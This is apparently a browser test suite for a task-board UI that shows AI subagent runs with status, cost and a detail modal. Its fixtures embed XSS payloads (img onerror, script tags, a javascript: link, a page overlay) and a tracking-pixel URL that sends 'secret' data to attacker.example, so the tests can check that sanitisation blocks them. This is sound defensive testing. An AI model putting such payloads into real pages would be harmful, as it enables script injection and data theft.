// Subagents in the unified task list: rows for the subagents a main agent
// launched appear among its tasks, visually marked as subagent work, with
// live status and spend. Same isolation pattern as the other suites: fetch
// and the coral WebSocket are stubbed before navigation.
const CDP = require('chrome-remote-interface');
const BASE = process.env.CORAL_URL || 'http://127.0.0.1:8462';
const CDP_PORT = parseInt(process.env.CDP_PORT || '9222', 10);
if (/:8420(\/|$)/.test(BASE) && !process.env.CORAL_TEST_ALLOW_PROD) { console.error('Refusing to run against the production port; use tests/frontend/run.sh.'); process.exit(2); }
const results = []; const check = (l, c, d) => { const v = c ? 'PASS' : 'FAIL'; results.push(v); console.log(`[${v}] ${l}${d !== undefined ? ' — ' + d : ''}`); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const U = () => require('crypto').randomUUID();
const A = U(), B = U();

const SESSIONS = [
  { name: 'coral-go', display_name: 'Lead Dev', agent_type: 'claude', session_id: A, summary: 'Working', working_directory: '/repo/coral-go' },
  { name: 'coral-go', display_name: 'Other Dev', agent_type: 'claude', session_id: B, summary: 'Working', working_directory: '/repo/coral-go' },
];
const SUBAGENTS = {
  [A]: [
    { id: 1, session_id: A, subagent_id: 'aca6223d75309e7ca', subagent_type: 'Explore', description: 'Map Coral task-board UI code', model: 'claude-opus-5',
      api_calls: 25, input_tokens: 50, output_tokens: 18854, cache_read_tokens: 2269410, cache_write_tokens: 138794, cost_usd: 7.42,
      finished: true, status: 'completed', started_at: '2026-09-17T02:10:18Z' },
    { id: 2, session_id: A, subagent_id: 'b7running00000000', subagent_type: 'Plan', description: 'Design <img src=x onerror="window.__xss=1"> the thing', model: 'claude-opus-5',
      api_calls: 1, input_tokens: 2, output_tokens: 10, cache_read_tokens: 0, cache_write_tokens: 0, cost_usd: 0.31,
      finished: false, status: 'in_progress', started_at: '2026-09-17T02:20:00Z' },
    { id: 3, session_id: A, subagent_id: 'c0nometa000000000', finished: false, status: 'skipped', cost_usd: 0, started_at: '2026-09-17T02:05:00Z' },
  ],
  [B]: [],
};
const BOARD_TASKS = [{ id: 77, title: 'A board task', body: 'Board body', status: 'pending', priority: 'medium', assigned_to: 'Lead Dev', created_by: 'Orchestrator', created_at: '2026-09-17T01:00:00Z' }];
const DETAILS = {
  aca6223d75309e7ca: { conversation_available: true, truncated: false,
    prompt: 'Map the task-board UI.\nScope: frontend only\nDepth: thorough\n\n<img src=x onerror="window.__xssPrompt=1"><script>window.__xssPromptScript=1</script>',
    result: ['## Findings', '', 'It lives in `tasks.js`, function **renderBoardTaskList**.', '',
      '- first point', '- second point', '',
      '| File | Role |', '|---|---|', '| tasks.js | renderer |', '| agentic.css | styles |', '',
      '```js', 'const x = 1;', '```', '',
      'See [the docs](https://example.com/docs).', '',
      '<img src=x onerror="window.__xssResult=1">', '![tracking pixel](https://attacker.example/leak.png?data=secret)', '<div style="position:fixed;inset:0">overlay</div>', '<script>window.__xssResultScript=1</script>', '<a href="javascript:window.__xssHref=1">bad link</a>', '',
      ...Array.from({ length: 60 }, (_, i) => `Filler paragraph ${i} to make the result box scroll.`)].join('\n') },
  b7running00000000: { conversation_available: true, truncated: false, prompt: 'Design the thing.', result: '' },
  c0nometa000000000: { conversation_available: false, truncated: false, prompt: '', result: '' },
};
const AGENT_TASKS = [{ id: 11, agent_name: 'coral-go', session_id: A, title: 'Ordinary agent task', completed: 0, sort_order: 0, created_at: '2026-09-17T02:00:00Z', kind: 'task' }];

const STUB = `
  window.__sessions = ${JSON.stringify(SESSIONS)}; window.__subagents = ${JSON.stringify(SUBAGENTS)}; window.__agentTasks = ${JSON.stringify(AGENT_TASKS)}; window.__boardTasks = ${JSON.stringify(BOARD_TASKS)}; window.__details = ${JSON.stringify(DETAILS)}; window.__detailFetches = [];
  window.__subagentFetches = [];
  (function(){ const Real = window.WebSocket; function Dead(u){ this.url=String(u); this.readyState=0; } Dead.prototype.send=function(){}; Dead.prototype.close=function(){}; Dead.prototype.addEventListener=function(){}; Dead.prototype.removeEventListener=function(){};
    function W(u,p){ if (/\\/ws\\//.test(String(u))) return new Dead(u); return p===undefined? new Real(u): new Real(u,p); } W.prototype=Real.prototype; W.CONNECTING=0; W.OPEN=1; W.CLOSING=2; W.CLOSED=3; window.WebSocket=W; })();
  window.__origFetch = window.fetch.bind(window);
  window.fetch = (url, opts) => { const u=String(url); const rel=u.replace(/^https?:\\/\\/[^/]+/,''); const path=rel.split('?')[0]; const qs=new URLSearchParams(rel.split('?')[1]||''); const m=((opts&&opts.method)||'GET').toUpperCase();
    const json=(b)=>Promise.resolve(new Response(JSON.stringify(b),{status:200,headers:{'Content-Type':'application/json'}}));
    if (m!=='GET') return json({ok:true});
    if (path==='/api/sessions/live') return json(window.__sessions);
    if (/^\\/api\\/sessions\\/live\\/[^/]+\\/subagents$/.test(path)) { const sid=qs.get('session_id'); window.__subagentFetches.push(sid); return json(window.__subagents[sid] || []); }
    if (/^\\/api\\/sessions\\/live\\/[^/]+\\/tasks$/.test(path)) return json(qs.get('session_id')===${JSON.stringify(A)} ? window.__agentTasks : []);
    const dm = path.match(/^\\/api\\/sessions\\/live\\/[^/]+\\/subagents\\/([^/]+)$/);
    if (dm) { const id = decodeURIComponent(dm[1]); window.__detailFetches.push(id); const sid = qs.get('session_id'); const row = (window.__subagents[sid] || []).find(x => x.subagent_id === id);
      return row ? json({ ...row, ...window.__details[id] }) : Promise.resolve(new Response('{"error":"not found"}', {status: 404})); }
    if (/^\\/api\\/board\\/[^/]+\\/tasks$/.test(path)) return json({tasks: window.__currentIsA ? window.__boardTasks : []});
    if (/^\\/api\\/board\\//.test(path)) return json({});
    return window.__origFetch(url, opts); };`;

async function run() {
  const client = await CDP({ port: CDP_PORT }); const { Page, Runtime, Emulation } = client;
  await Promise.all([Page.enable(), Runtime.enable()]);
  await Page.addScriptToEvaluateOnNewDocument({ source: STUB });
  const ev = async (x) => { const r = await Runtime.evaluate({ expression: x, awaitPromise: true, returnByValue: true }); if (r.exceptionDetails) throw new Error('page eval: ' + JSON.stringify(r.exceptionDetails).slice(0, 400)); return r.result.value; };
  await Emulation.setDeviceMetricsOverride({ width: 1500, height: 950, deviceScaleFactor: 1, mobile: false });
  await Page.navigate({ url: BASE + '/' }); await Page.loadEventFired();
  for (let i = 0; i < 50; i++) { if (await ev(`typeof window._coralSetLiveSessions === 'function' && typeof window.selectLiveSession === 'function'`)) break; await sleep(100); }
  await ev(`window.switchNavTab('agents'); window._coralSetLiveSessions(JSON.parse(JSON.stringify(window.__sessions))); true`);

  const open = async (sid) => { await ev(`window.__currentIsA = ${JSON.stringify(sid)} === ${JSON.stringify(A)}; true`); await ev(`Promise.resolve(window.selectLiveSession('coral-go', 'claude', ${JSON.stringify(sid)})).then(() => { window.switchAgenticTab('tasks', 'top'); return true; })`); await sleep(700); };
  const rows = () => ev(`Array.from(document.querySelectorAll('#board-task-list .board-task-item:not(.board-task-header)')).map(el => { const q = s => el.querySelector(s); const cs = getComputedStyle(el);
    return { sub: el.classList.contains('board-task-subagent'), classes: el.className, subagentId: el.dataset.subagentId || null,
      type: (q('.board-task-type')||{}).textContent, typeIsChip: !!q('.board-task-type-subagent'), typeIcon: (q('.board-task-type-subagent .material-icons')||{}).textContent || null, typeTitle: q('.board-task-type') ? q('.board-task-type').getAttribute('title') : null,
      badge: (q('.board-task-subagent-badge')||{}).textContent || null, desc: (q('.board-task-desc')||{}).textContent, descHasImg: !!q('.board-task-desc img'), tooltip: q('.board-task-desc') ? q('.board-task-desc').getAttribute('title') : null,
      assignee: (q('.board-task-assignee')||{}).textContent, cost: (q('.board-task-cost')||{}).textContent.trim(), costLive: !!q('.board-task-cost-live'),
      spinner: !!q('.task-spinner'), icon: (q('.board-task-status-icon')||{}).textContent || null, clickable: el.hasAttribute('onclick'),
      descW: q('.board-task-desc') ? q('.board-task-desc').getBoundingClientRect().width : 0, rowW: el.getBoundingClientRect().width, listScrollW: document.getElementById('board-task-list').scrollWidth,
      boxShadow: cs.boxShadow, bgImage: cs.backgroundImage, chipColor: q('.board-task-type') ? getComputedStyle(q('.board-task-type')).color : null }; })`);
  const bySub = (rs, id) => rs.find(r => r.subagentId === id);

  // ── Agent A: subagents mixed into the task list ──
  await open(A);
  let rs = await rows();
  check('section is visible', await ev(`document.getElementById('board-tasks-section').style.display !== 'none'`));
  check('board task + agent task + three subagent rows', rs.length === 5 && rs.filter(r => r.sub).length === 3, `rows=${rs.length} sub=${rs.filter(r => r.sub).length}`);
  check('subagents fetched for the selected session', (await ev(`window.__subagentFetches`)).includes(A));

  const done = bySub(rs, 'aca6223d75309e7ca'), running = bySub(rs, 'b7running00000000'), bare = bySub(rs, 'c0nometa000000000');
  const task = rs.find(r => !r.sub && r.type === 'agent');
  check('every subagent row found by data-subagent-id', !!(done && running && bare));

  // Flair
  check('subagent row: violet left rail', /163,\s*113,\s*247/.test(done.boxShadow) && /inset/.test(done.boxShadow), done.boxShadow);
  check('subagent row: tinted gradient background', /gradient/.test(done.bgImage), done.bgImage);
  check('subagent type chip with icon', done.typeIsChip && done.typeIcon === 'account_tree' && /sub/.test(done.type), `${done.typeIcon} / ${done.type}`);
  check('type chip is violet', /163,\s*113,\s*247/.test(done.chipColor), done.chipColor);
  check('type chip names the launching agent', done.typeTitle === 'Subagent launched by Lead Dev', done.typeTitle);
  check('subagent-type badge', done.badge === 'Explore' && running.badge === 'Plan', `${done.badge}, ${running.badge}`);
  check('ordinary task has none of it', !task.sub && !task.typeIsChip && !task.badge && task.type === 'agent' && task.boxShadow === 'none', `${task.type} / ${task.boxShadow}`);

  // Layout: the description must survive the default (narrow) panel width.
  check('description column keeps a readable width', done.descW >= 160 && task.descW >= 160, `sub=${done.descW} task=${task.descW}`);
  check('row spans the full scrollable width (rail and tint are not cut off)', Math.abs(done.rowW - done.listScrollW) <= 1, `row=${done.rowW} list=${done.listScrollW}`);

  // Content
  check('description is the title', done.desc === 'ExploreMap Coral task-board UI code', done.desc);
  check('assigned to the launching main agent', done.assignee === 'Lead Dev' && running.assignee === 'Lead Dev', done.assignee);
  check('tooltip: type, model, calls, tokens', /Subagent \(Explore\)/.test(done.tooltip) && /claude-opus-5/.test(done.tooltip) && /25 API calls/.test(done.tooltip) && /tokens/.test(done.tooltip), done.tooltip);
  check('tooltip singular "1 API call"', /1 API call(?!s)/.test(running.tooltip), running.tooltip);
  check('no metadata: generic title, no badge', bare.desc === 'Subagent' && !bare.badge, bare.desc);
  check('subagent rows are clickable', done.clickable && running.clickable && bare.clickable);

  // Status + spend
  check('completed: check icon, final cost', done.icon === 'check_circle' && !done.spinner && done.cost === '$7.42' && !done.costLive, `${done.icon} ${done.cost}`);
  check('running: spinner, live ~cost', running.spinner && running.cost === '~$0.31' && running.costLive, `${running.cost}`);
  check('stopped: skipped icon, no cost', bare.icon === 'block' && bare.cost === '', `${bare.icon} "${bare.cost}"`);
  check('count badge counts subagents', (await ev(`document.getElementById('task-bar-count').textContent`)) === '2/5', await ev(`document.getElementById('task-bar-count').textContent`));

  // Escaping
  check('description HTML is escaped', !running.descHasImg && /<img/.test(running.desc) && !(await ev(`window.__xss === 1`)), running.desc);

  // Sort by type groups subagents together
  await ev(`window._toggleTaskSort('type'); true`); await sleep(100);
  rs = await rows();
  const kinds = rs.map(r => r.sub ? 's' : 't').join('');
  check('sorting by Type keeps subagents contiguous', /^t*s{3}t*$/.test(kinds), kinds);
  await ev(`window._toggleTaskSort('created_at'); true`);

  // ── Detail modal ──
  const modal = () => ev(`(() => { const m = document.getElementById('task-detail-modal'); const c = document.getElementById('task-detail-content'); const q = s => c.querySelector(s);
    const fields = {}; c.querySelectorAll('.task-detail-field').forEach(f => { fields[f.querySelector('.task-detail-label').textContent] = f.querySelector('.task-detail-value').textContent.trim(); });
    const sections = {}; c.querySelectorAll('.task-detail-section').forEach(sec => { sections[sec.querySelector('.task-detail-label').textContent] = sec.textContent.replace(sec.querySelector('.task-detail-label').textContent, '').trim(); });
    return { open: m.style.display !== 'none', header: document.getElementById('task-detail-modal-title').textContent, title: (q('.task-detail-title')||{}).textContent, status: (q('.task-detail-status')||{}).textContent,
      chip: (q('.subagent-detail-chip')||{}).textContent || null, badge: (q('.board-task-subagent-badge')||{}).textContent || null, fields, sections,
      costLive: !!q('.task-detail-cost-summary.board-task-cost-live'), cost: (q('.task-detail-cost-summary')||{}).textContent,
      md: (() => { const boxes = Array.from(c.querySelectorAll('.subagent-detail-text')); const [promptBox, resultBox] = boxes; const n = (root, sel) => root ? root.querySelectorAll(sel).length : -1;
        return { boxes: boxes.length, promptIsMd: !!promptBox && promptBox.classList.contains('subagent-detail-md'), resultIsMd: !!resultBox && resultBox.classList.contains('subagent-detail-md'),
          promptBr: n(promptBox, 'br'), h2: resultBox ? (resultBox.querySelector('h2')||{}).textContent : null, li: n(resultBox, 'li'), strong: resultBox ? (resultBox.querySelector('strong')||{}).textContent : null,
          inlineCode: resultBox ? (resultBox.querySelector('p code')||{}).textContent : null, th: n(resultBox, 'th'), td: n(resultBox, 'td'), preCode: resultBox ? (resultBox.querySelector('pre code')||{}).textContent : null,
          link: resultBox ? (a => a ? { href: a.getAttribute('href'), target: a.getAttribute('target'), rel: a.getAttribute('rel') } : null)(resultBox.querySelector('a[href^="https://example.com"]')) : null,
          scripts: n(c, 'script'), onerror: n(c, '[onerror]'), imgs: n(c, 'img'), styled: n(c, '.subagent-detail-md [style]'), jsHrefs: n(c, 'a[href^="javascript:"]'), rawHashes: resultBox ? /##\s*Findings/.test(resultBox.textContent) : null,
          whiteSpace: resultBox ? getComputedStyle(resultBox).whiteSpace : null, thBorder: resultBox && resultBox.querySelector('th') ? getComputedStyle(resultBox.querySelector('th')).borderTopStyle : null,
          scrollable: resultBox ? resultBox.scrollHeight > resultBox.clientHeight + 20 : null }; })(),
      footer: document.getElementById('task-detail-modal-footer').textContent.trim() }; })()`);
  const clickRow = async (id) => { await ev(`document.querySelector('#board-task-list [data-subagent-id="${id}"]').click(); true`); await sleep(350); };

  check('modal is closed to begin with', !(await modal()).open);
  await clickRow('aca6223d75309e7ca');
  let m = await modal();
  check('clicking a subagent row opens the overlay', m.open && m.header === 'Subagent', m.header);
  check('modal: title, status, subagent chip and type badge', m.title === 'Map Coral task-board UI code' && m.status === 'Completed' && /subagent/.test(m.chip) && m.badge === 'Explore', `${m.title} / ${m.status} / ${m.chip} / ${m.badge}`);
  check('modal: launched by, model, API calls, id', m.fields['Launched By'] === 'Lead Dev' && m.fields['Model'] === 'claude-opus-5' && m.fields['API Calls'] === '25' && m.fields['Subagent ID'] === 'aca6223d75309e7ca', JSON.stringify(m.fields));
  check('modal: finished subagent shows Started, not the running-only fields', !!m.fields['Started'] && !('Last Activity' in m.fields) && !('Running For' in m.fields), JSON.stringify(m.fields));
  check('modal: final cost with token breakdown', m.cost === '$7.42' && !m.costLive && /Input/.test(m.sections['Cost']) && /Cache Read/.test(m.sections['Cost']) && /2\.3M/.test(m.sections['Cost']), m.sections['Cost']);
  check('modal: prompt and result fetched from the detail endpoint', (await ev(`window.__detailFetches`)).includes('aca6223d75309e7ca') && /Map the task-board UI\./.test(m.sections['Prompt']) && /renderBoardTaskList/.test(m.sections['Result']), JSON.stringify([m.sections['Prompt'], m.sections['Result']]));
  // Markdown rendering
  check('result renders as markdown, not raw source', m.md.resultIsMd && m.md.h2 === 'Findings' && m.md.rawHashes === false, JSON.stringify({ h2: m.md.h2, raw: m.md.rawHashes }));
  check('markdown: list, bold and inline code', m.md.li === 2 && m.md.strong === 'renderBoardTaskList' && m.md.inlineCode === 'tasks.js', JSON.stringify([m.md.li, m.md.strong, m.md.inlineCode]));
  check('markdown: table with styled cells', m.md.th === 2 && m.md.td === 4 && m.md.thBorder === 'solid', JSON.stringify([m.md.th, m.md.td, m.md.thBorder]));
  check('markdown: fenced code block keeps its text', /const x = 1;/.test(m.md.preCode || ''), m.md.preCode);
  check('markdown: links open in a new tab and cannot reach the opener', m.md.link && m.md.link.href === 'https://example.com/docs' && m.md.link.target === '_blank' && /noopener/.test(m.md.link.rel || ''), JSON.stringify(m.md.link));
  check('markdown box drops pre-wrap so rendered blocks lay out normally', m.md.whiteSpace === 'normal', m.md.whiteSpace);
  check('prompt renders as markdown and keeps its single line breaks', m.md.promptIsMd && m.md.promptBr >= 2 && /Scope: frontend only/.test(m.sections['Prompt']), `br=${m.md.promptBr}`);
  const xss = await ev(`[window.__xssPrompt, window.__xssPromptScript, window.__xssResult, window.__xssResultScript, window.__xssHref].map(v => v === 1)`);
  check('hostile HTML in prompt or result never executes', xss.every(v => v === false), JSON.stringify(xss));
  check('...and is stripped from the DOM: no script, no onerror, no javascript: href', m.md.scripts === 0 && m.md.onerror === 0 && m.md.jsHrefs === 0, JSON.stringify([m.md.scripts, m.md.onerror, m.md.jsHrefs]));

  check('no images or inline styles survive: a report cannot make the browser call out or restyle the page', m.md.imgs === 0 && m.md.styled === 0, JSON.stringify([m.md.imgs, m.md.styled]));
  const leaked = await ev(`performance.getEntriesByType('resource').filter(e => /attacker\\.example/.test(e.name)).length`);
  check('...and no request was made to the remote image host', leaked === 0, String(leaked));

  // Reading position survives the 10s poll
  check('long result scrolls inside its box', m.md.scrollable === true);
  const mark = () => ev(`(() => { const el = document.querySelectorAll('#task-detail-content .subagent-detail-text')[1]; el.scrollTop = 150; el.__marked = true; return el.scrollTop; })()`);
  const probe = () => ev(`(() => { const el = document.querySelectorAll('#task-detail-content .subagent-detail-text')[1]; return { scrollTop: el.scrollTop, sameNode: el.__marked === true }; })()`);
  const waitForPoll = async () => { const before = (await ev(`window.__subagentFetches.length`)); for (let i = 0; i < 28; i++) { await sleep(500); if ((await ev(`window.__subagentFetches.length`)) > before) break; } await sleep(300); };
  const setTo = await mark();
  await waitForPoll();
  let pr = await probe();
  check('poll with no changes does not re-render the open modal', pr.sameNode && pr.scrollTop === setTo, JSON.stringify(pr));
  await ev(`window.__subagents[${JSON.stringify(A)}][0] = { ...window.__subagents[${JSON.stringify(A)}][0], api_calls: 26 }; true`);
  await waitForPoll();
  pr = await probe();
  m = await modal();
  check('poll with changed stats re-renders but keeps the reading position', !pr.sameNode && pr.scrollTop === setTo && m.fields['API Calls'] === '26', JSON.stringify({ ...pr, calls: m.fields['API Calls'] }));
  check('modal: footer is just Close', m.footer === 'Close', m.footer);

  check('modal: finished subagent with no recorded end time shows no duration (not time-since-start)', !('Duration' in m.fields), JSON.stringify(m.fields));
  await ev(`document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' })); true`); await sleep(150);
  check('Escape closes it', !(await modal()).open);

  await clickRow('c0nometa000000000');
  m = await modal();
  check('stopped subagent without transcript: stats shown, conversation unavailable', m.open && m.status === 'Stopped' && m.title === 'Subagent' && m.badge === null && /no longer available/.test(m.sections['Prompt']) && !('Result' in m.sections), JSON.stringify(m.sections));
  await ev(`window.hideTaskDetailModal(); true`);

  await clickRow('b7running00000000');
  m = await modal();
  check('running subagent: In Progress, live cost, no result yet', m.status === 'In Progress' && m.costLive && m.cost === '~$0.31' && 'Running For' in m.fields && /Still working/.test(m.sections['Result']) && /Design the thing\./.test(m.sections['Prompt']), JSON.stringify([m.status, m.cost, m.sections['Result']]));

  // ── Live update via the poll, with the modal open ──
  await ev(`window.__subagents[${JSON.stringify(A)}][1] = { ...window.__subagents[${JSON.stringify(A)}][1], finished: true, status: 'completed', cost_usd: 1.25, last_activity_at: '2026-09-17T02:25:30Z' }; window.__details.b7running00000000.result = 'The design is done.'; window.__detailFetches.length = 0; true`);
  let flipped = null;
  for (let i = 0; i < 28; i++) { await sleep(500); flipped = bySub(await rows(), 'b7running00000000'); if (flipped && !flipped.spinner) break; }
  check('poll refreshes the row without user action', flipped && !flipped.spinner && flipped.icon === 'check_circle' && flipped.cost === '$1.25', flipped && `${flipped.icon} ${flipped.cost}`);
  await sleep(400);
  m = await modal();
  check('open modal follows: completed, final cost, duration', m.open && m.status === 'Completed' && m.cost === '$1.25' && !m.costLive && m.fields['Duration'] === '5m 30s', JSON.stringify([m.status, m.cost, m.fields['Duration']]));
  check('open modal fetches the result once the subagent finishes', (await ev(`window.__detailFetches`)).includes('b7running00000000') && /The design is done\./.test(m.sections['Result']), m.sections['Result']);

  // ── The overlay is shared with board tasks ──
  await ev(`window.showTaskDetailModal(77); true`); await sleep(200);
  m = await modal();
  check('board task modal still works', m.open && m.header === 'Task #77' && m.title === 'A board task', m.header);
  await ev(`window.__subagents[${JSON.stringify(A)}][0] = { ...window.__subagents[${JSON.stringify(A)}][0], cost_usd: 9.99 }; true`);
  for (let i = 0; i < 28; i++) { await sleep(500); const r = bySub(await rows(), 'aca6223d75309e7ca'); if (r && r.cost === '$9.99') break; }
  m = await modal();
  check('a subagent poll does not overwrite an open board task modal', m.header === 'Task #77' && m.title === 'A board task' && !('Subagent ID' in m.fields), m.header + ' / ' + m.title);
  await ev(`window.hideTaskDetailModal(); true`);

  // ── Agent B shares the name "coral-go" but launched nothing ──
  await open(B);
  rs = await rows();
  check("another agent does not inherit the previous agent's subagents", rs.filter(r => r.sub).length === 0, `sub rows=${rs.filter(r => r.sub).length}`);
  check('an agent with nothing to show hides the section', await ev(`document.getElementById('board-tasks-section').style.display === 'none'`));
  check('subagents fetched by session id, not agent name', (await ev(`window.__subagentFetches`)).includes(B));

  await open(A);
  check('switching back restores them', (await rows()).filter(r => r.sub).length === 3);

  await client.close();
  const failed = results.filter(r => r === 'FAIL').length;
  console.log(`\nsubagent_tasks: ${results.length - failed}/${results.length} passed`);
  process.exit(failed ? 1 : 0);
}
run().catch(e => { console.error(e); process.exit(1); });
